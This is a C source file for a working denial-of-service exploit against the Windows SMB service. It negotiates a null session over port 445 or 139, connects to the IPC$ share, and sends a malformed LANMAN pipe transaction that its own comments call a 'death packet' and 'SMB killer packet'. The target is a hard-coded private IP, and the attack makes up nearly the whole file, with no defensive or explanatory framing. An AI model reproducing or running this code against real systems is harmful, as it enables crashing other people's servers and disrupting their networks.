#pragma warning(disable:4996)

#include "Winsock2.h"
#include "stdio.h"

#define TARGET_PORT 139

/* Header structure for the Server Message Block (SMB) protocol
    included in all smb protocol transactions
*/
typedef struct SMBHeader_S
{ char serverComponent[4]; /* Always \xFFSMB */
  char command;
  char errorClass;
  char reserved1;
  char errorCode[2];
  char flags;
  char flags2[2];
  char reserved2[12];
  char treeID[2];
  char processID[2];
  char userID[2];
  char multiplexID[2];
} SMBHeader;

/* Some nice constants for setting up a SMB header record */
#define HEADER_PROTOCOL_REQUEST     0x1
#define HEADER_SESSION_SETUP        0x2
#define HEADER_TREE_CONNECT         0x3
#define HEADER_TRANSACTION_REQUEST  0x4 

typedef struct NegotiateProtocol_S
{	char wordCount;
	char byteCount[2];
	char dialects[130];
} NegotiateProtocol; 

typedef struct
{	BYTE Type;			// Type of packet
	BYTE Flags;			// flags (length extension flag is all that's used)
	WORD Length;		// Length of additional data
//	WORD Padding;		// additional frame padding??
} NBSESSIONHEADER, *PNBSESSIONHEADER;

typedef struct
{	DWORD MagicVal;
	BYTE Command;
	union 
	{	struct 
		{	BYTE ErrorClass;
			BYTE Reserved;
			WORD ErrorCode;
		};
		DWORD NTError;
	};
	// flags field
	BYTE bLockAndReadWriteAndUnlock:1;
	BYTE bSendWithoutAck:1;
	BYTE bReservedBit:1;
	BYTE bNoCaseSensitivePaths:1;
	BYTE bCanonicalizedPaths:1;
	BYTE bOpportunisticLocks:1;
	BYTE bChangeNotify:1;
	BYTE bResponse:1;
	// 2nd flags field
	BYTE bLongFilenames:1;
	BYTE bExtendedAttributes:1;
	BYTE bFlags2IsLongName:1;
	BYTE bUnknown1:1;
	BYTE bUnknown2:1;
	BYTE bUnknown3:1; //***
	BYTE bUnknown4:1;
	BYTE bUnknown5:1; //***

	BYTE bUnknown6:1;
	BYTE bUnknown7:1;
	BYTE bUnknown8:1;
	BYTE bExtendedSecurity:1;
	BYTE bResolveViaDFS:1;
	BYTE bReadGrantedWithExecPerms:1;
	BYTE bNTErrorCodes:1;
	BYTE bUnicodeStrings:1;

	WORD PID;
	DWORD HdrReserved;
	WORD SessionID;
	WORD SequenceNumber;


	BYTE Padding[2];
	WORD TreeID;
	WORD CallersProcess;
	WORD UserID;
	WORD MultiplexID;
} SMBHEADER, *PSMBHEADER;

typedef struct
{	BYTE Len;		// should be 17
	WORD DialectIndex;
	BYTE bUserLevelSecurity:1;
	BYTE bEncryptPasswords:1;
	BYTE bSecuritySignaturesEnabled:1;
	BYTE bSecuritySignaturesRequired:1;
	BYTE bReserved:4;
	WORD MaxPendingMpxRequests;
	WORD MaxVCsInClientAndServer;
	DWORD MaxTransmitBufferSize;
	DWORD MaxRawBufferSize;
	DWORD UniqueSessionKey;
	BYTE bReadAndWriteRawMode:1;
	BYTE bReadAndWriteMultiplexMode:1;
	BYTE bUnicode:1;
	BYTE bLargeFiles:1;
	BYTE bNTLM012Dialect:1;
	BYTE bRAPIviaRPC:1;
	BYTE bNT32BitStatus:1;
	BYTE bLevelIIOplocks:1;

	BYTE bLOCK_AND_READ_Command:1;
	BYTE bNT_FIND_SBM_Command:1;
	BYTE Unused1:2;
	BYTE bDFSAware:1;
	BYTE Unused2:3;

	BYTE Unused3;

	BYTE Unused4:5;
	BYTE bBulkTransfer:1;
	BYTE bCompressedData:1;
	BYTE bExtendedSecurity:1;

	DWORD SystemDate;
	DWORD SystemTime;
	WORD TimeZone;
	BYTE EncryptionKeyLen;
	WORD ByteCount;
} SMBDIALECTSELECTHEADER, *PSMBDIALECTSELECTHEADER;
#define SMBDIALECTSELECTHEADER_LEN			17

typedef struct 
{	BYTE Len;	// should be 10
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD MaxBufferSize;
	WORD MaxMpxCount;
	WORD VcNumber;	// 0 = first (only), nonzero=additional VC number
	DWORD SessionKey;
	WORD PasswordLen;
	DWORD Reserved;
	WORD ByteCount;
} SESSION_SETUP_ANDHEADER, *PSESSION_SETUP_ANDHEADER;
#define SESSION_SETUP_ANDHEADER_LEN 10

typedef struct 
{	BYTE Len;	// should be 13
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD MaxBufferSize;
	WORD MaxMpxCount;
	WORD VcNumber;	// 0 = first (only), nonzero=additional VC number
	DWORD SessionKey;
	WORD CaseInsensitivePasswordLen;
	WORD CaseSensitivePasswordLen;
	DWORD Reserved;
	DWORD ClientCaps;
	WORD ByteCount;
} SESSION_SETUP_ANDHEADER2, *PSESSION_SETUP_ANDHEADER2;
#define SESSION_SETUP_ANDHEADER2_LEN 13

typedef struct 
{	BYTE Len;	// should be 12
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD MaxBufferSize;
	WORD MaxMpxCount;
	WORD VcNumber;	// 0 = first (only), nonzero=additional VC number
	DWORD SessionKey;
	WORD SecurityBlobLen;
	DWORD Reserved;
	DWORD ClientCaps;
	WORD ByteCount;
} SESSION_SETUP_ANDHEADER2EX, *PSESSION_SETUP_ANDHEADER2EX;
#define SESSION_SETUP_ANDHEADER2EX_LEN 12

typedef struct
{	BYTE Len;	// should be 3
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD Action;
	WORD ByteCount;
} SESSION_SETUP_ANDRESPONSEHEADER, *PSESSION_SETUP_ANDRESPONSEHEADER;
// followed by
// SZ Server native OS
// SZ Server native LanMan
// SZ Server primary domain
#define SESSION_SETUP_ANDRESPONSEHEADER_LEN 3

typedef struct
{	BYTE Len;	// should be 4
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD Flags;
	WORD PasswordLen;
	WORD ByteCount;
} TREE_CONNECT_ANDHEADER, *PTREE_CONNECT_ANDHEADER;
#define TREE_CONNECT_ANDHEADER_LEN 4


typedef struct
{	BYTE Len;	// should be 3
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	WORD OptionalSupport;
	WORD ByteCount;
} TREE_CONNECT_ANDRESPONSEHEADER, *PTREE_CONNECT_ANDRESPONSEHEADER;
// followed by
// SZ Servicetype connected to
// SZ NativeFileSystem
#define TREE_CONNECT_ANDRESPONSEHEADER_LEN 3

typedef struct 
{	BYTE Len;	// should be 24
	BYTE AndXCommand;
	BYTE AndXReserved;
	WORD AndXOffset;
	BYTE Reserved;
	WORD NameLength;
	DWORD Flags;
	DWORD RootDirectoryFid;
	DWORD AccessMask;
	LARGE_INTEGER AllocationSize;
	DWORD ExtFileAttributes;
	DWORD ShareAccess;
	DWORD CreateDisposition;
	DWORD CreateOptions;
	DWORD ImpersonationLevel;
	BYTE SecurityFlags;
	WORD ByteCount;
} NT_CREATE_ANDHEADER, *PNT_CREATE_ANDHEADER;
#define NT_CREATE_ANDHEADER_LEN 24

#define TYPE_SESSION_MESSAGE			0x00
#define TYPE_SESSION_REQUEST			0x81
#define TYPE_POSITIVE_SESSION_RESPONSE	0x82
#define TYPE_NEGATIVE_SESSION_RESPONSE	0x83
#define TYPE_RETARGET_SESSION_RESPONSE	0x84
#define TYPE_SESSION_KEEP_ALIVE			0x85
#define SMB_COM_CREATE_DIRECTORY		0x00
#define SMB_COM_DELETE_DIRECTORY		0x01
#define SMB_COM_OPEN					0x02
#define SMB_COM_CREATE					0x03
#define SMB_COM_CLOSE					0x04 
#define SMB_COM_FLUSH					0x05 
#define SMB_COM_DELETE					0x06 
#define SMB_COM_RENAME					0x07 
#define SMB_COM_QUERY_INFORMATION		0x08 
#define SMB_COM_SET_INFORMATION			0x09 
#define SMB_COM_READ					0x0A 
#define SMB_COM_WRITE					0x0B 
#define SMB_COM_LOCK_BYTE_RANGE			0x0C 
#define SMB_COM_UNLOCK_BYTE_RANGE		0x0D 
#define SMB_COM_CREATE_TEMPORARY		0x0E 
#define SMB_COM_CREATE_NEW				0x0F 
#define SMB_COM_CHECK_DIRECTORY			0x10 
#define SMB_COM_PROCESS_EXIT			0x11 
#define SMB_COM_SEEK					0x12 
#define SMB_COM_LOCK_AND_READ			0x13 
#define SMB_COM_WRITE_AND_UNLOCK		0x14 
#define SMB_COM_READ_RAW				0x1A 
#define SMB_COM_READ_MPX				0x1B 
#define SMB_COM_READ_MPX_SECONDARY		0x1C 
#define SMB_COM_WRITE_RAW				0x1D 
#define SMB_COM_WRITE_MPX				0x1E 
#define SMB_COM_WRITE_COMPLETE			0x20 
#define SMB_COM_SET_INFORMATION2		0x22 
#define SMB_COM_QUERY_INFORMATION2		0x23 
#define SMB_COM_LOCKING_ANDX			0x24 
#define SMB_COM_TRANSACTION				0x25 
#define SMB_COM_TRANSACTION_SECONDARY	0x26 
#define SMB_COM_IOCTL					0x27 
#define SMB_COM_IOCTL_SECONDARY			0x28 
#define SMB_COM_COPY					0x29 
#define SMB_COM_MOVE					0x2A 
#define SMB_COM_ECHO					0x2B 
#define SMB_COM_WRITE_AND_CLOSE			0x2C 
#define SMB_COM_OPEN_ANDX				0x2D 
#define SMB_COM_READ_ANDX				0x2E 
#define SMB_COM_WRITE_ANDX				0x2F 
#define SMB_COM_CLOSE_AND_TREE_DISC		0x31 
#define SMB_COM_TRANSACTION2			0x32 
#define SMB_COM_TRANSACTION2_SECONDARY	0x33 
#define SMB_COM_FIND_CLOSE2				0x34 
#define SMB_COM_FIND_NOTIFY_CLOSE		0x35 
#define SMB_COM_TREE_CONNECT			0x70 
#define SMB_COM_TREE_DISCONNECT			0x71 
#define SMB_COM_NEGOTIATE               0x72
#define SMB_COM_SESSION_SETUP_ANDX      0x73
#define SMB_COM_LOGOFF_ANDX             0x74
#define SMB_COM_TREE_CONNECT_ANDX       0x75
#define SMB_COM_QUERY_INFORMATION_DISK  0x80
#define SMB_COM_SEARCH                  0x81
#define SMB_COM_FIND                    0x82
#define SMB_COM_FIND_UNIQUE             0x83
#define SMB_COM_NT_TRANSACT             0xA0
#define SMB_COM_NT_TRANSACT_SECONDARY   0xA1
#define SMB_COM_NT_CREATE_ANDX          0xA2
#define SMB_COM_NT_CANCEL               0xA4
#define SMB_COM_OPEN_PRINT_FILE         0xC0
#define SMB_COM_WRITE_PRINT_FILE        0xC1
#define SMB_COM_CLOSE_PRINT_FILE        0xC2
#define SMB_COM_GET_PRINT_QUEUE         0xC3
#define SMB_COM_READ_BULK               0xD8
#define SMB_COM_WRITE_BULK              0xD9
#define SMB_COM_WRITE_BULK_DATA         0xDA
#define SMB_NONE						0xFF

typedef struct
{	SOCKET		connectionsock;
	SOCKADDR_IN sourcesockaddr;
	int			hostcount;
} NEWCONINFO, *PNEWCONINFO;

typedef struct
{	SOCKET connectionsock;
	SOCKET relaysock;
	char header[sizeof(SMBHEADER) + sizeof(NBSESSIONHEADER)];
} RELAYCONINFO, *PRELAYCONINFO;

/* Structure used to establish a null session on the
  target host */
typedef struct SessionSetup_S
{ char wordCount;
  char andXCommand;
  char reserved1;
  char andXOffset[2];
  char maxBufferCount[2];
  char maxMpxCount[2];
  char vcNumber[2];
  char sessionKey[4];
  char ansiPasswordLen[2];
  char unicodePasswordLen[2];
  char reserved2[4];
  char capabilities[4];
  char byteCount[2];
  char ansiPassword;
  char account;
  char domain[10];
  char nativeOS[5];
  char nativeLan[6];
} SessionSetup; 

/* Structure to actually connect to the IPC$ share */
typedef struct TreeConnect_S
{ char wordCount;
  char andXCommand;
  char reserved1;
  char andXOffset[2];
  char flags[2];
  char passwordLen[2];
  char byteCount[2];
  char password;
} TreeConnect;

/* Structure to connect and start a netbios session */
typedef struct NBSessionRequest_S
{ char space1;
  char destname[32]; /* Destination computer */
  char null;
  char space2;
  char srcname[32];  /* Source computer */
  char end[5];
} NBSessionRequest; 

/* Netbios header, included in all Net Bios network packets */
typedef struct NetBiosHeader_S
{	char messageType; /* Type of netbios message */
	char flags;
	char length[2];  /* Length of this netbios packet */
} NetBiosHeader; 

/* This is the actual death packet, just set all the count fields to zero and watch the fun */
typedef struct TransactionRequest_S
{ char wordCount;
  char totalParamCount[2];
  char totalDataCount[2];
  char maxParamCount[2];
  char maxDataCount[2];
  char maxSetupCount;
  char reserved1;
  char flags[2];
  char timeout[4];
  char reserved2[2];
  char paramCount[2];
  char paramOffset[2];
  char dataCount[2];
  char dataOffset[2];
  char setupCount;
  char reserved3;
  char byteCount[2];
  char transactionName[13];
  char parameters[19];
} TransactionRequest; 

int  connectSession(SOCKET,char*);
int  connectTree(SOCKET,int,int*,char*);
void handleError(char*);
int  nbmakehspacket(char*,char*,char*);
void Pad_Name(char*,char*);
int  sendNBMessage(SOCKET,char,char*,int,char*,int,int);
void sendTransaction(SOCKET,int,int);
int  setupProtocols(SOCKET);
int  setupSession(SOCKET,int*);
void populateNegotiateProtocol(NegotiateProtocol*);
void populateSessionSetup(SessionSetup*);
void populateSMBHeader(SMBHeader*, int);
void populateTransactionRequest(TransactionRequest*);
void populateTreeConnect(TreeConnect*);


void main()
{
SOCKET  s;
WSADATA wsaData;
struct  sockaddr_in A;
struct  hostent *H;
int  packetsize=100;
char buf[10];
char ppos=0;
int  i;
unsigned long ul=0,addr = inet_addr("192.168.14.34");
 
	if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
	{	//printf("Error: wsastartup failed\n"); 
		return; 
	} 
 
	if(INVALID_SOCKET==(s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)))
	{	//printf("Error: cannot create tcp socket\n"); 
		return;
	} 

	//Disable non-blocking IO for purposes of this example.
	ioctlsocket(s,FIONBIO,&ul);
	A.sin_family=AF_INET; 
	A.sin_port=htons(50251);
	A.sin_addr.s_addr=inet_addr("192.168.14.35");
	i = bind(s,(sockaddr*)&A,sizeof(A));

	//Agar nomi kerak bo'lsa;
	if(!(H=gethostbyaddr((char*)&addr,4,AF_INET)))//if(!(H=gethostbyname(target)))
		return;

	//A.sin_family=AF_INET; 
	A.sin_port=htons(445);
	A.sin_addr.s_addr=inet_addr("192.168.14.35");
 
	if(0!=connect(s,(struct sockaddr*)&A,sizeof(A)))
	{	i = WSAGetLastError();
		A.sin_port=htons(139);
		if(0!=connect(s,(struct sockaddr*)&A,sizeof(A)))
		{	//printf("Error: cannot connect to target host\n"); 
			closesocket(s); 
			return;
	}	}
	//printf("-&gt; connected\n"); 
	 
	/* Create a session */
/*	if(!connectSession(s,H->h_name))
		printf("Session connected...\n");
	else
	{	sprintf(buf, "Unable to connect to session with host %s...\n", H->h_name);
		handleError(buf);
	}*/

	/* Setup the protocol to be used for death */
	if(!setupProtocols(s))
		printf("Protocols negotiated...\n");
	else
		handleError("Unable to negotiate protocols...\n");

	/* Setup the session and get a user id */
 int userID, treeID;
	if(!setupSession(s, &userID))
		printf("Session connected and established, User ID: %d...\n", userID);
	else
		handleError("Unable establish session...\n");

	/* Connect to the IPC$ share and get a tree id */
	if(!connectTree(s, userID, &treeID, H->h_name))
		printf("Connected to \\\\%s\\IPC$ session, Tree ID: %d...\n", H->h_name, treeID);
	else
	{   sprintf(buf, "Unable to connect to \\\\%s\\IPC$ session...\n", H->h_name);
		handleError(buf);
	}

	/* Send the actual death packet */
	sendTransaction(s, userID, treeID);
	printf("SMB killer packet sent!\n");
  
 
	closesocket(s);
	WSACleanup();
}

/* Connect to a null session on the target computer */
int connectSession(SOCKET s,char* TARGET_HOST)
{  /* Setup the initial SMB request */
char myname[33], target[33], buf[4000];
NBSessionRequest smbreq;
int x;

  Pad_Name("", myname);
  myname[30] = 'A';
  myname[31] = 'A';

  Pad_Name(TARGET_HOST, target);

  memset(buf,0,4000);

  /* Setup the session request data elements */
  smbreq.space1 = '\x20';
  smbreq.space2 = '\x20';
  smbreq.null = '\x00';
  memcpy(smbreq.end,"\x00\x00\x00\x00\x00",5);
  memcpy(smbreq.srcname, myname, 32);
  memcpy(smbreq.destname, target, 32);

  /* Send the session request */
  x = sendNBMessage(s, '\x81', (char*)&smbreq, sizeof(NBSessionRequest), buf, 4000, 1);

  if(x < 1)
    handleError("Problem, didn't get response\n");

  if(buf[0] == '\x82')
    return 0; /* Got an OK from the host */
  else
    return 1; /* Non-OK message, return error */
} 

/* Connect to the IPC$ share, this returns a tree id to be used
  in the subsequent transaction call */
int connectTree(SOCKET s, int userID, int *treeID, char *TARGET_HOST)
{
SMBHeader smbh;
TreeConnect tc;
int x, totalSize, temp = 0, hostlen = 0, byteCount = 0;
char buf[4000], *sendBuf = NULL;

  populateSMBHeader(&smbh, HEADER_TREE_CONNECT);
  populateTreeConnect(&tc);

  smbh.userID[0] = ((char*)&userID)[0];
  smbh.userID[1] = ((char*)&userID)[1];

  /* Put in the host information */
  sprintf(buf, "\\\\%s\\IPC$", TARGET_HOST);
  hostlen = strlen(buf) + 1;
  byteCount = hostlen + 6;
  totalSize = sizeof(SMBHeader) + sizeof(TreeConnect) + hostlen + 5;
  sendBuf = (char*)malloc(totalSize);

  /* Set the byte count of this message */
  tc.byteCount[0] = ((char*)&byteCount)[0];
  tc.byteCount[1] = ((char*)&byteCount)[1];

  /* Copy all the data to a buffer to send it */
  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &tc, sizeof(TreeConnect));
  memcpy(sendBuf + sizeof(SMBHeader) + sizeof(TreeConnect), buf, hostlen);
  memcpy(sendBuf + sizeof(SMBHeader) + sizeof(TreeConnect) + hostlen, 
"IPC\x00\x00", 5);

  x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

  /* Make sure we got some data back */
  if(x >= 1)
  { memcpy(&smbh, buf + sizeof(NetBiosHeader), sizeof(SMBHeader));
    if(smbh.errorCode[0] != '\x00')
      return 1;

    /* Extract the tree ID from the returned message */
    ((char*)&temp)[0] = smbh.treeID[0];
    ((char*)&temp)[1] = smbh.treeID[1];

    *treeID = temp;

    return 0;
  }
  else
    return 1;
}

/* Prints out an error message and exits the program */
void handleError(char *msg)
{
  printf("ERROR: %s\n", msg);
  WSACleanup();
  exit(1);
}

/* Pads out the netbios name in a session request,
  props to rain forest puppy (rfp@wiretrip.net)
  and his RFPParalyze.c code on el8.org for this
  function */
void Pad_Name(char *name1, char *name2)
{ char c, c1, c2;
  int i, len;

  len = strlen(name1);

  for(i = 0; i < 16; i++)
  {	if (i >= len)
	{
     c1 = 'C'; c2 = 'A'; /* CA is a space */
    }
    else
	{ c = name1[i];
      c1 = (char)((int)c/16 + (int)'A');
      c2 = (char)((int)c%16 + (int)'A');
    }

    name2[i*2] = c1;
    name2[i*2+1] = c2;
  }
  name2[32] = 0;   /* Put in the null ...*/
}

/* Fill in the negotiate protocol data structure */
void populateNegotiateProtocol(NegotiateProtocol *np)
{
char dialects[] =
"\x02PC NETWORK PROGRAM 1.0\x00"
"\x02LANMAN1.0\x00"
"\x02Windows for Workgroups 3.1a\x00"
"\x02LM1.2X002\x00"
"\x02LANMAN2.1\x00"
"\x02NT LM 0.12\x00"
"\x02SMB 2.002\x00"
"\x02SMB 2\x00";
  memset(np, 0, sizeof(NegotiateProtocol));
  memcpy(np->byteCount, "\x81\x00", 2);
  memcpy(np->dialects, dialects, sizeof(dialects));
} 

/* Fill in the session setup data structure */
void populateSessionSetup(SessionSetup *ss)
{
  memset(ss, 0, sizeof(SessionSetup));
  ss->wordCount = '\x0D';
  ss->andXCommand = '\xFF';
  memcpy(ss->maxBufferCount, "\xFF\xFF", 2);
  memcpy(ss->maxMpxCount, "\x02\x00", 2);
  memcpy(ss->vcNumber, "\x01\x04", 2);
  memcpy(ss->ansiPasswordLen, "\x01\x00", 2);
  memcpy(ss->byteCount, "\x17\x00", 2);
  memcpy(ss->domain, "WORKGROUP\x00", 10);
  memcpy(ss->nativeOS, "Unix\x00", 5);
  memcpy(ss->nativeLan, "Samba\x00", 6);
} 

/* This function fills in the data for an SMB header
  structure based on what type of message we're sending */
void populateSMBHeader(SMBHeader *sh, int header_type)
{
  memset(sh, 0, sizeof(SMBHeader));
  memcpy(sh->serverComponent, "\xFF\x53\x4D\x42", 4);

  switch(header_type) {
    case HEADER_PROTOCOL_REQUEST :
      sh->command = '\x72';
      memcpy(sh->processID, "\xED\x18", 2);
      memcpy(sh->multiplexID, "\x51\x19", 2);
      break;

    case HEADER_SESSION_SETUP :
      sh->command = '\x73';
      memcpy(sh->flags2, "\x01\x00", 2);
      memcpy(sh->processID, "\x01\x04", 2);
      memcpy(sh->multiplexID, "\x65\x04", 2);
      break;

    case HEADER_TREE_CONNECT :
      sh->command = '\x75';
      sh->flags = '\x18';
      memcpy(sh->flags2, "\x01\x20", 2);
      memcpy(sh->processID, "\x00\x28", 2);
      memcpy(sh->userID, "\x00\x08", 2);
      break;

    case HEADER_TRANSACTION_REQUEST :
      sh->command = '\x25';
      memcpy(sh->treeID, "\x00\x08", 2);
      memcpy(sh->processID, "\x24\x04", 2);
      memcpy(sh->userID, "\x00\x08", 2);
      break;

  }
}

/* Fill in the transaction request structure */
void populateTransactionRequest(TransactionRequest *tr)
{ memset(tr, 0, sizeof(TransactionRequest));
  tr->wordCount = '\x0E';
  memcpy(tr->totalParamCount, "\x13\x00", 2);
  memcpy(tr->paramCount, "\x13\x00", 2);
  memcpy(tr->paramOffset, "\x4C\x00", 2);
  memcpy(tr->dataOffset, "\x5F\x00", 2);
  memcpy(tr->byteCount, "\x20\x00", 2);
  memcpy(tr->transactionName, "\\PIPE\\LANMAN\x00", 13);
  memcpy(tr->parameters, 
"\x68\x00\x57\x72\x4C\x65\x68\x00\x42\x31\x33\x42\x57\x7A\x00\x01\x00\xE0\xFF", 
19);
}

/* Fill in the tree connect structure */
void populateTreeConnect(TreeConnect *tc)
{
  memset(tc, 0, sizeof(TreeConnect));
  tc->wordCount = '\x04';
  tc->andXCommand = '\xFF';
  memcpy(tc->passwordLen, "\x01\x00", 2);
  memcpy(tc->byteCount, "\x14\x00", 2);
}

/* Sends a netbios message to the target */
int sendNBMessage(SOCKET s, char msgtype, char *data, int len, char *buffer, int buflen, int waitreturn)
{
NetBiosHeader nbh;
int r, totalSize = sizeof(NetBiosHeader) + len, offset = sizeof(NetBiosHeader);
char *sendBuffer = NULL;

  /* Setup the NetBios header structure */
  nbh.messageType = msgtype;
  nbh.flags = '\x00';
  nbh.length[0] = ((char*)&len)[1];
  nbh.length[1] = ((char*)&len)[0];

  /* Setup a buffer to contain the entire message */
  sendBuffer = (char*) malloc(totalSize);
  memcpy(sendBuffer, &nbh, sizeof(NetBiosHeader));
  memcpy(sendBuffer + offset, data, len);

  /* Send the data to the host */
  send(s, sendBuffer, totalSize, 0);
  free(sendBuffer);

  /* Receive any return data */
  if(waitreturn)
    r = recv(s, buffer, buflen, 0);
  else
    r = 0;

  return r;
}

/* Send the actual death packet call, using the user id and
  tree id we got back from the server */
void sendTransaction(SOCKET s, int userID, int treeID)
{
SMBHeader smbh;
TransactionRequest tr;
int totalSize = sizeof(SMBHeader) + sizeof(TransactionRequest);
char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(TransactionRequest)];

  populateSMBHeader(&smbh, HEADER_TRANSACTION_REQUEST);
  populateTransactionRequest(&tr);

  /* Set the user id and tree id */
  smbh.userID[0] = ((char*)&userID)[0];
  smbh.userID[1] = ((char*)&userID)[1];
  smbh.treeID[0] = ((char*)&treeID)[0];
  smbh.treeID[1] = ((char*)&treeID)[1];

  /* Copy all the data to a buffer to send */
  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &tr, sizeof(TransactionRequest));

  sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 0);
}

/* Send protocol information to the host */
int setupProtocols(SOCKET s)
{
SMBHeader smbh;
NegotiateProtocol np;
int x, totalSize = sizeof(SMBHeader) + sizeof(NegotiateProtocol);
char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(NegotiateProtocol)];

	populateSMBHeader(&smbh, HEADER_PROTOCOL_REQUEST);
	populateNegotiateProtocol(&np);

	memcpy(sendBuf, &smbh, sizeof(SMBHeader));
	memcpy(sendBuf + sizeof(SMBHeader), &np, sizeof(NegotiateProtocol));

	x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

	if(x >= 1)
		return 0;
	else
		return 1;
}

/* Setup the actual session, this returns a user id to be used
  in subsequent calls to the target */
int setupSession(SOCKET s, int *userID)
{
SMBHeader smbh;
SessionSetup ss;
int x, totalSize = sizeof(SMBHeader) + sizeof(SessionSetup), temp = 0;
char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(SessionSetup)];

  populateSMBHeader(&smbh, HEADER_SESSION_SETUP);
  populateSessionSetup(&ss);

  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &ss, sizeof(SessionSetup));

  x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

  /* Make sure we got some data back */
  if(x >= 1) {
    /* Retrieve the user id from the returned data */
    memcpy(&smbh, buf + sizeof(NetBiosHeader), sizeof(SMBHeader));
    if(smbh.errorCode[0] != '\x00')
      return 1;

    ((char*)&temp)[0] = smbh.userID[0];
    ((char*)&temp)[1] = smbh.userID[1];

    *userID = temp;

    return 0;
  }
  else
    return 1;
}